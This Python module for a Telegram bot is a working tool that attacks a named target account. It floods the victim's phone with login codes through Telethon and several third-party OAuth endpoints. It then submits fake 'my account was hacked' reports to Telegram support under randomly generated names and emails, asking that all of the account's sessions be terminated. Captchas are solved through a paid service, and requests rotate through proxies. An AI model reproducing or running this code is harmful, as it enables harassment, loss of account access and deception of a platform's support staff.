import asyncio, glob, json, os, random, re, secrets, time
import urllib.parse
import requests
from telethon import TelegramClient
from telethon.sessions import StringSession
import config as _cfg

scriptDir = os.path.dirname(os.path.abspath(__file__))
apiId = int(_cfg.AUREPORT_API_ID)
apiHash = _cfg.AUREPORT_API_HASH
sessionsDir = os.path.join(scriptDir, "sessions")

supportUrl = "https://telegram.org/support"
captchaUrl = "https://telegram.org/support/captcha"
browserUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
uaPool = [
    browserUa,
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]
codeServiceEndpoints = [
    "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
    "https://translations.telegram.org/auth/request",
    "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
    "https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F",
    "https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin",
    "https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F",
]

maleFirst = ["Александр", "Сергей", "Дмитрий", "Андрей", "Алексей", "Иван", "Максим", "Николай", "Владимир", "Игорь", "Михаил", "Роман", "Артём", "Павел", "Денис", "Евгений", "Егор", "Илья", "Кирилл", "Антон"]
femaleFirst = ["Анна", "Мария", "Елена", "Ольга", "Наталья", "Ирина", "Татьяна", "Светлана", "Юлия", "Екатерина", "Виктория", "Ксения", "Александра", "Дарья", "Полина", "Марина", "Алина", "Валерия", "Анастасия", "Софья"]
lastNames = ["Иванов", "Смирнов", "Кузнецов", "Попов", "Соколов", "Лебедев", "Козлов", "Новиков", "Морозов", "Петров", "Волков", "Соловьёв", "Васильев", "Зайцев", "Павлов", "Семёнов", "Голубев", "Виноградов", "Богданов", "Фёдоров"]
maleMid = ["Александрович", "Сергеевич", "Дмитриевич", "Андреевич", "Алексеевич", "Иванович", "Максимович", "Николаевич", "Владимирович", "Игоревич", "Михайлович", "Романович", "Павлович", "Денисович", "Евгеньевич", "Юрьевич"]
femaleMid = ["Александровна", "Сергеевна", "Дмитриевна", "Андреевна", "Алексеевна", "Ивановна", "Максимовна", "Николаевна", "Владимировна", "Игоревна", "Михайловна", "Романовна", "Павловна", "Денисовна", "Евгеньевна", "Юрьевна"]
translitMap = {"а":"a","б":"b","в":"v","г":"g","д":"d","е":"e","ё":"e","ж":"zh","з":"z","и":"i","й":"y","к":"k","л":"l","м":"m","н":"n","о":"o","п":"p","р":"r","с":"s","т":"t","у":"u","ф":"f","х":"kh","ц":"ts","ч":"ch","ш":"sh","щ":"sch","ъ":"","ы":"y","ь":"","э":"e","ю":"yu","я":"ya"}
mailDomains = ["gmail.com", "yandex.ru", "mail.ru", "outlook.com", "yahoo.com", "icloud.com", "proton.me"]

defaultText = (
    "Приветствую, поддержка Telegram! У меня возникла крупная проблема\n"
    "Мой личный аккаунт {handle} (id{id}) взломали злоумышленники! Я перешёл по ссылке которая выглядела "
    "обычной, но на самом деле была фишинг, затем меня выбросило с моего аккаунта, на данный момент на нём "
    "проходит рассылка всем моим чатам и контактам от мошенников в виде фишинг-ссылок!\n"
    "Мой номер - {phone}.\n"
    "Пожалуйста, завершите все сеансы на моём аккаунте! Спасибо!"
)

SUBMISSIONS = 2
CODE_SESSIONS = 3
CODE_SERVICE_ROUNDS = 3
SPEED = 1.5
CALL_TIMEOUT = 25.0
PROXY_FALLBACK = True
STICKY_SESSID = True


class SafeDict(dict):
    def __missing__(self, key):
        return "{" + key + "}"


def _load_proxies_from_file() -> list[str]:
    path = os.path.join(scriptDir, "proxies.txt")
    try:
        with open(path, encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        result = []
        for line in lines:
            # убираем протокол — нам нужен голый host:port[:user:pass]
            for pfx in ("http://", "socks4://", "socks5://"):
                if line.startswith(pfx):
                    line = line[len(pfx):]
            if line:
                result.append(line)
        return result
    except FileNotFoundError:
        return []


def _rucaptcha_key() -> str:
    return _cfg.RUCAPTCHA_KEY


def translit(value: str) -> str:
    return "".join(translitMap.get(ch, ch) for ch in value.lower())


def randomLegalName():
    if random.random() < 0.7:
        first, last, mid = random.choice(maleFirst), random.choice(lastNames), random.choice(maleMid)
    else:
        first, last, mid = random.choice(femaleFirst), random.choice(lastNames) + "а", random.choice(femaleMid)
    return f"{last} {first} {mid}", first, last


def randomEmail(first: str, last: str) -> str:
    f, l = translit(first), translit(last)
    year = random.randint(1975, 2005)
    styles = [f"{f}.{l}", f"{f}_{l}{year%100:02d}", f"{l}.{f}", f"{f[:1]}.{l}", f"{f}{l}{year}", f"{f}.{l}.{year}", f"{f}-{l}"]
    return f"{random.choice(styles)}@{random.choice(mailDomains)}"


def pickIdentity():
    legal, first, last = randomLegalName()
    email = randomEmail(first, last)
    return legal, email


def buildHttpProxies(proxyStr: str, sessid: str):
    if not proxyStr:
        return None
    parts = proxyStr.split(":")
    if len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
    if len(parts) == 4:
        rawUser, rawPwd = parts[2], parts[3]
        if "{sessid}" in rawUser or "{sessid}" in rawPwd:
            rawUser = rawUser.replace("{sessid}", sessid)
            rawPwd = rawPwd.replace("{sessid}", sessid)
        elif STICKY_SESSID:
            rawUser = f"{rawUser}__sessid.{sessid}"
        user = urllib.parse.quote(rawUser, safe=".;_-")
        pwd = urllib.parse.quote(rawPwd)
        url = f"http://{user}:{pwd}@{parts[0]}:{parts[1]}"
        return {"http": url, "https": url}
    return None


def getForm(session):
    r = session.get(supportUrl, timeout=45, headers={
        "User-Agent": browserUa,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    })
    r.raise_for_status()
    m = re.search(r'data-sitekey="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("turnstile sitekey not found")
    return m.group(1)


def fetchSupport(proxyStr: str, sessid: str):
    s = requests.Session()
    s.proxies = buildHttpProxies(proxyStr, sessid) or {}
    try:
        return getForm(s), s
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
        if not (PROXY_FALLBACK and s.proxies):
            raise
        d = requests.Session()
        d.proxies = {}
        return getForm(d), d


def solveTurnstile(sitekey: str, key: str) -> str:
    task = {"type": "TurnstileTaskProxyless", "websiteURL": supportUrl, "websiteKey": sitekey, "userAgent": browserUa}
    create = requests.post("https://api.rucaptcha.com/createTask", timeout=30,
                           json={"clientKey": key, "task": task}).json()
    if create.get("errorId"):
        raise RuntimeError(f"rucaptcha create: {create.get('errorCode') or create}")
    taskId = create["taskId"]
    for _ in range(60):
        time.sleep(5)
        res = requests.post("https://api.rucaptcha.com/getTaskResult", timeout=30,
                            json={"clientKey": key, "taskId": taskId}).json()
        if res.get("errorId"):
            raise RuntimeError(f"rucaptcha poll: {res.get('errorCode') or res}")
        if res.get("status") == "ready":
            return res["solution"]["token"]
    raise RuntimeError("rucaptcha timeout")


def verifyCaptcha(session, token: str):
    headers = {
        "User-Agent": browserUa,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://telegram.org",
        "Referer": supportUrl,
    }
    for _ in range(20):
        r = session.post(captchaUrl, data={"token": token}, headers=headers, timeout=30)
        try:
            j = r.json()
        except Exception:
            raise RuntimeError(f"captcha_bad_response:{r.status_code}")
        if j.get("error"):
            raise RuntimeError(f"captcha_error:{j['error']}")
        if j.get("pending"):
            time.sleep(0.3)
            continue
        if j.get("ok"):
            return True
        raise RuntimeError(f"captcha_unexpected:{j}")
    raise RuntimeError("captcha_pending_timeout")


def detectSuccess(status: int, body: str, url: str):
    if status not in (200, 302):
        return False, f"bad_status_{status}"
    low = (body or "").lower()
    if "alert-success" in low or "thanks for your report" in low:
        return True, "alert_success"
    if "invalid captcha" in low:
        return False, "invalid_captcha"
    if "alert-danger" in low:
        m = re.search(r'alert-danger[^>]*>([^<]{0,120})', body or "")
        return False, f"alert:{(m.group(1).strip() if m else '')[:80]}"
    if "success" in (url or "").lower():
        return True, "url_success"
    return False, "no_success_marker"


def submitFinal(session, message: str, phone: str, legalName: str, email: str):
    r = session.post(supportUrl, timeout=60, allow_redirects=True, headers={
        "User-Agent": browserUa,
        "Referer": supportUrl,
        "Origin": "https://telegram.org",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
    }, data={"message": message, "legal_name": legalName, "email": email, "phone": phone, "setln": ""})
    ok, reason = detectSuccess(r.status_code, r.text or "", r.url or "")
    return ok, r.status_code, reason


async def resolveTarget(target: str):
    isId = target.lstrip("@").isdigit()
    sess_files = glob.glob(os.path.join(sessionsDir, "*.session"))
    random.shuffle(sess_files)
    for path in sess_files[:6]:
        c = TelegramClient(path[:-len(".session")], apiId, apiHash)
        try:
            await asyncio.wait_for(c.connect(), timeout=CALL_TIMEOUT)
            if not await c.is_user_authorized():
                await c.disconnect()
                continue
            ent = await asyncio.wait_for(
                c.get_entity(int(target)) if isId else c.get_entity(target),
                timeout=CALL_TIMEOUT
            )
            return (getattr(ent, "username", "") or ""), int(getattr(ent, "id", 0))
        except Exception:
            pass
        finally:
            try:
                await c.disconnect()
            except Exception:
                pass
    return "", (int(target) if isId else 0)


async def sendCodeOnce(phone: str) -> tuple[bool, str | None]:
    c = TelegramClient(StringSession(), apiId, apiHash)
    try:
        await asyncio.wait_for(c.connect(), timeout=CALL_TIMEOUT)
        await asyncio.wait_for(c.send_code_request(phone), timeout=CALL_TIMEOUT)
        return True, None
    except Exception as e:
        return False, f"{type(e).__name__}:{e}"
    finally:
        try:
            await c.disconnect()
        except Exception:
            pass


async def sendCodes(phone: str, notify) -> int:
    await notify(f"📱 *Отправка кодов входа* ({CODE_SESSIONS} сессий)...")
    okCount = 0
    for i in range(CODE_SESSIONS):
        good, err = await sendCodeOnce(phone)
        if good:
            okCount += 1
        if i + 1 < CODE_SESSIONS:
            await asyncio.sleep(1.5 / SPEED)
    await notify(f"📱 Коды отправлены: *{okCount}/{CODE_SESSIONS}*")
    return okCount


def serviceRoundOnce(phone: str, proxyStr: str, sessid: str) -> int:
    proxies = buildHttpProxies(proxyStr, sessid) if proxyStr else None
    hits = 0
    for url in codeServiceEndpoints:
        try:
            r = requests.post(url, headers={"User-Agent": random.choice(uaPool)},
                              data={"phone": phone}, proxies=proxies, timeout=25)
            if r.status_code in (200, 302):
                hits += 1
        except Exception:
            pass
    return hits


async def sendCodesViaService(phone: str, httpProxyList: list[str], notify) -> int:
    if CODE_SERVICE_ROUNDS <= 0:
        return 0
    digits = re.sub(r"[^0-9]", "", phone)
    await notify(f"🔁 *Сервисные коды* ({CODE_SERVICE_ROUNDS} раундов)...")
    loop = asyncio.get_event_loop()
    total = 0
    for i in range(CODE_SERVICE_ROUNDS):
        proxyStr = random.choice(httpProxyList) if httpProxyList else ""
        sessid = secrets.token_hex(8)
        hits = await loop.run_in_executor(None, lambda p=proxyStr, s=sessid: serviceRoundOnce(digits, p, s))
        total += hits
        await asyncio.sleep(1.0 / SPEED)
    await notify(f"🔁 Сервисных кодов принято: *{total}*")
    return total


async def oneSubmission(idx: int, total: int, ctx: dict, phone: str,
                        httpProxyList: list[str], key: str, notify) -> bool:
    sessid = secrets.token_hex(8)
    legalName, email = pickIdentity()
    proxyStr = random.choice(httpProxyList) if httpProxyList else ""
    message = defaultText.format_map(SafeDict(
        handle=ctx["handle"], id=ctx["id"], phone=phone, target=ctx["target"],
        name=legalName, email=email
    ))
    await notify(f"📋 *Обращение {idx}/{total}*\n└─ `{legalName}` · `{email}`")
    loop = asyncio.get_event_loop()

    sitekey, session = await loop.run_in_executor(None, lambda: fetchSupport(proxyStr, sessid))
    await notify(f"🔐 *Решаю капчу...* `{sitekey[:20]}...`")

    token = await loop.run_in_executor(None, lambda: solveTurnstile(sitekey, key))
    await notify("✅ *Капча решена, верифицирую...*")

    await loop.run_in_executor(None, lambda: verifyCaptcha(session, token))
    await asyncio.sleep(random.uniform(5.0, 15.0) / SPEED)

    await notify(f"📤 *Отправляю обращение {idx}/{total}...*")
    ok, status, reason = await loop.run_in_executor(
        None, lambda: submitFinal(session, message, phone, legalName, email)
    )
    if ok:
        await notify(f"✅ *Обращение {idx}/{total} принято!* `{reason}`")
    else:
        await notify(f"❌ *Обращение {idx}/{total} отклонено* `{status}` `{reason}`")
    return ok


async def main_support(target: str, phone: str, uid: int, username: str, notify_bot=None):
    """
    Точка входа для бота.
    notify_bot — Bot instance для отправки прогресс-сообщений пользователю.
    """
    key = _rucaptcha_key()
    if not key:
        if notify_bot:
            await notify_bot.send_message(uid, "❌ *RUCAPTCHA_KEY не задан в конфиге!*", parse_mode="Markdown")
        return False

    httpProxyList = _load_proxies_from_file()

    async def notify(text: str):
        if notify_bot:
            try:
                await notify_bot.send_message(uid, text, parse_mode="Markdown")
            except Exception:
                pass

    await notify(f"🎫 *Саппорт метод запущен*\n└─ Цель: `{target}`\n└─ Телефон: `{phone}`")

    username_resolved, tgId = await resolveTarget(target)
    if not tgId:
        await notify("❌ *Не удалось определить ID цели.* Попробуй передать числовой ID вместо @username.")
        return False

    ctx = {
        "handle": f"@{username_resolved}" if username_resolved else f"id{tgId}",
        "id": tgId,
        "target": target,
    }
    await notify(f"🔍 *Цель определена:* `{ctx['handle']}` `(id{tgId})`")

    await sendCodes(phone, notify)
    await sendCodesViaService(phone, httpProxyList, notify)

    total = max(1, SUBMISSIONS)
    okCount = 0
    for idx in range(1, total + 1):
        try:
            if await oneSubmission(idx, total, ctx, phone, httpProxyList, key, notify):
                okCount += 1
        except Exception as e:
            await notify(f"⚠️ *Ошибка обращения {idx}/{total}:* `{str(e)[:120]}`")

    if okCount:
        await notify(
            f"🎫 *Готово!*\n"
            f"└─ Обращений отправлено: *{okCount}/{total}*\n"
            f"└─ Коды входа: ✅\n"
            f"└─ Сервисные коды: ✅"
        )
    else:
        await notify(f"❌ *Все обращения отклонены ({total}/{total}).*\nПроверь прокси и баланс rucaptcha.")

    return bool(okCount)
